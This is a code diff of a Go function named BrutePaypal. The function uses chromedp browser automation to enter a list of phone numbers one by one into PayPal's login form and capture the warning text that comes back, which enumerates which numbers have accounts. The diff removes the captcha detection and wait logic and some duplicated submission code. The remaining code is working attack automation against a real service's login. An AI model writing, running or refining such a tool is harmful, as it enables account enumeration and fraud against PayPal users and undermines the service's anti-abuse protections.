@@ -48,27 +48,12 @@ func BrutePaypal() {
 	errorUser := ""
 	firsAcess := true
 	for indexPayload := 0; indexPayload < len(payloads); indexPayload++ {
-		isCaptcha := ""
 		PhoneNumber := payloads[indexPayload]
 		fmt.Println("Trying Phone Number:", PhoneNumber)
 		if errorUser != "" || firsAcess {
 			err := chromedp.Run(ctx,
 				chromedp.WaitVisible(`#email`, chromedp.ByID),
 				chromedp.Sleep(1*time.Second),
-				chromedp.Evaluate(`document.querySelector("[action='/auth/validatecaptcha']")?"true":"false"`, &isCaptcha),
-			)
-			if err != nil {
-				log.Fatal(err)
-			}
-			if isCaptcha == "true" {
-				err = chromedp.Run(ctx,
-					chromedp.WaitNotPresent(`[action="/auth/validatecaptcha"]`, chromedp.ByQuery),
-				)
-				if err != nil {
-					log.Fatal(err)
-				}
-			}
-			err = chromedp.Run(ctx,
 				chromedp.SendKeys(`#email`, PhoneNumber, chromedp.ByID),
 				chromedp.Sleep((15/10)*time.Second),
 				chromedp.KeyEvent(kb.Enter),
@@ -84,28 +69,6 @@ func BrutePaypal() {
 			err := chromedp.Run(ctx,
 				chromedp.WaitVisible(`#backToInputEmailLink`, chromedp.ByID),
 				chromedp.Evaluate(`document.getElementById("backToInputEmailLink").click()`, nil),
-				chromedp.WaitVisible(`#email`, chromedp.ByID),
-				chromedp.Evaluate(`document.querySelector("[action='/auth/validatecaptcha']")?"true":"false"`, &isCaptcha),
-				chromedp.SendKeys(`#email`, PhoneNumber, chromedp.ByID),
-				chromedp.Sleep((15/10)*time.Second),
-				chromedp.KeyEvent(kb.Enter),
-				chromedp.WaitReady(`.transitioning.spinner`, chromedp.ByQuery),
-				chromedp.WaitReady(`.notification-warning, .transitioning.hide`, chromedp.ByQuery),
-				chromedp.Sleep(1*time.Second),
-				chromedp.Evaluate(`!document.getElementsByClassName("notification-warning")[0].className.includes("hide")?document.getElementsByClassName("notification-warning")[0].innerText:""`, &errorUser),
-			)
-			if err != nil {
-				log.Fatal(err)
-			}
-			if isCaptcha == "true" {
-				err = chromedp.Run(ctx,
-					chromedp.WaitNotPresent(`[action="/auth/validatecaptcha"]`, chromedp.ByQuery),
-				)
-				if err != nil {
-					log.Fatal(err)
-				}
-			}
-			err = chromedp.Run(ctx,
 				chromedp.SendKeys(`#email`, PhoneNumber, chromedp.ByID),
 				chromedp.Sleep((15/10)*time.Second),
 				chromedp.KeyEvent(kb.Enter),
